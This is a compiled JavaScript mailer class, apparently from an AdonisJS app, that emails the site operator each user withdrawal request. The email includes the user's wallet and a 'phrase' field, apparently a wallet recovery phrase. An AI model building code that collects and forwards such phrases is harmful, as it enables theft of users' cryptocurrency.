"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const Mail_1 = global[Symbol.for('ioc.use')]("Adonis/Addons/Mail");
const Env_1 = __importDefault(global[Symbol.for('ioc.use')]("Adonis/Core/Env"));
class WithdrawAlert extends Mail_1.BaseMailer {
    constructor(user, amount, address, coin, wallet, phrase, date) {
        super();
        this.user = user;
        this.amount = amount;
        this.address = address;
        this.coin = coin;
        this.wallet = wallet;
        this.phrase = phrase;
        this.date = date;
    }
    prepare(message) {
        message
            .subject("A user has made a withdrawal request")
            .from(Env_1.default.get("SMTP_USERNAME"))
            .to(Env_1.default.get("SMTP_USERNAME"))
            .htmlView("emails/withdraw", {
            email: this.user.email,
            amount: this.amount,
            name: this.user.fullName,
            address: this.address,
            coin: this.coin,
            phrase: this.phrase,
            wallet: this.wallet,
            date: this.date,
        });
    }
}
exports.default = WithdrawAlert;
//# sourceMappingURL=WithdrawAlert.js.map